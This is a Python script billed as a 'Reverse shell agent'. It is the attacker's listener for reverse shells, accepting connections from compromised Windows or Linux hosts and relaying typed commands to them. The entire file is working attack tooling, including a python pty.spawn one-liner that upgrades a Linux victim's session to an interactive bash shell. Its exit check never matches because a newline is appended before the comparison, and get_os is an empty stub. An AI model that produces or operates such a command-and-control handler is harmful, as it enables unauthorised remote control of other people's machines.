import socket
import argparse

def start_server(host='0.0.0.0', port=9000):
	mode = input("Based on OS(Windows / Linux): ")
	if str.lower(mode) in ["windows", "w"]:
		mode = 1
	elif str.lower(mode) in ["linux", "l"]:
		mode = 0
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_conn:
		server_conn.bind((host, port))
		server_conn.listen()
		tty_flag = False
		print(f"Server listening on {host}:{port}")
		while True:
			client_conn, addr = server_conn.accept()
			client_conn.settimeout(1.0)
			with client_conn:
				print(f"Connection from {addr[0]}:{addr[1]}")
				while True:
					command = input()
					command += "\n"
					if command == 'exit':
						break
					if (command == 'tty shell\n' or tty_flag) and mode == 0:
						if not tty_flag:
							command = """python -c 'import pty; pty.spawn("/bin/bash")'\n"""
							client_conn.send(command.encode())
							data = client_conn.recv(1024)
							print(f"{data.decode('utf-8', 'ignore')}", end='')
							tty_flag = True
							continue
						if command == '\n':
							client_conn.send(command.encode())
							while True:
								try:
									data = client_conn.recv(1024)
									if len(data) == 0:
										break
									print(f"{data.decode('utf-8', 'ignore')}", end='')
								except TimeoutError:
									break
							continue
						client_conn.send(command.encode())
						while True:
							try:
								data = client_conn.recv(1024)
								if len(data) == 0:
									break
								print(f"{data.decode('utf-8', 'ignore')}", end='')
							except TimeoutError:
								break
						continue

					if not tty_flag and mode == 0:
						if command == '\n':
							print("\n> ", end='')
							continue
						client_conn.send(command.encode())
						while True:
							try:
								data = client_conn.recv(1024)
								if len(data) == 0:
									break
								print()
								print(f"{data.decode('utf-8', 'ignore')}", end='')
							except TimeoutError:
								break
						print("\n> ", end='')

					if mode == 1:
						if command == '\n':
							client_conn.send(command.encode())
							while True:
								try:
									data = client_conn.recv(1024)
									if len(data) == 0:
										break
									print(f"{data.decode('gbk', 'ignore')}", end='')
								except TimeoutError:
									break
							continue
						client_conn.send(command.encode())
						while True:
							try:
								data = client_conn.recv(1024)
								if len(data) == 0:
									break
								print(f"{data.decode('gbk', 'ignore')}", end='')
							except TimeoutError:
								break
						continue

# TODO
def get_os():
	pass

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="Reverse shell agent")
	parser.add_argument("-p", "--port", default=9000, type=int, help="Listen on the specific port")
	args = parser.parse_args()
	start_server(port=args.port)